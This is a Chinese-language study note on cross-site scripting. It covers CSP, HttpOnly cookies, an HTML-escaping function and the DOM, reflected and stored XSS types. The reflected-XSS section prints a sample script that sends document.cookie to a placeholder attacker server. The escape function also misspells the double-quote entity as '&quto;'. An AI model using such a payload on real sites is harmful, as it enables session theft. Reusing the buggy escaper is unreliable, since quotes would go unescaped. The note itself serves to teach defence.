<!--
 * @Author: your name
 * @Date: 2020-03-07 14:18:48
 * @LastEditTime: 2020-03-19 20:37:44
 * @LastEditors: Please set LastEditors
 * @Description: In User Settings Edit
 * @FilePath: \RW 笔记\web安全\介绍.md
 -->

[常见六大Web安全攻防解析](https://www.cnblogs.com/fundebug/p/details-about-6-web-security.html)



防御方式：
> + CSP
> CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。
设置 HTTP Header 中的 Content-Security-Policy
设置 meta 标签的方式

>+ 转义字符
```js
  function escape(str) {
    str = str.replace(/&/g, '&amp;')
    str = str.replace(/</g, '&lt;')
    str = str.replace(/>/g, '&gt;')
    str = str.replace(/"/g, '&quto;')
    str = str.replace(/'/g, '&#39;')
    str = str.replace(/`/g, '&#96;')
    str = str.replace(/\//g, '&#x2F;')
    return str
  }
  ```
> + HttpOnly Cookie。

# 介绍

xss: 跨站脚本攻击（Cross Site Scripting，本来缩写是CSS，为了和层叠样式的CSS有所区别，所以在安全领域叫“XSS”。）是最常见和基本的攻击 WEB 网站方法。

XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。



# XSS主要分为三类
## DOM XSS
实际上就是前端 js 代码把不可信的内容插入到了页面。在使用 .innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为 HTML 插到页面上，尽量使用 .innerText、.textContent、.setAttribute() 等。

## 反射型 XSS 

反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。也就是说，黑客往往需要引诱用户点击一个非法链接，才能攻击成功。
例如一个非法连接中可能存在这样一个script：
```html
<script>window.open('http://xx.xx.xx.xx:8080/ck.php?c='+document.cookie)</script>
```
当执行这个非法链接后，即可将用户的cookie写入到xx.xx.xx.xx的服务器下的cookie.txt文件中。


## 存储型 XSS :

存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。

## XSS预防：

1、过滤特殊字符

2、设置httpOnly，浏览器将禁止页面的JS访问带有HttpOnly属性的Cookie。HttpOnly解决的是XSS后的Cookie劫持攻击。

3、在服务端使用 HTTP的CSP( Content-Security-Policy) 头部来指定策略，或者在前端设置 meta 标签。

[内容安全策略CSP（Content-Security-Policy）](https://blog.csdn.net/u014465934/article/details/84199171)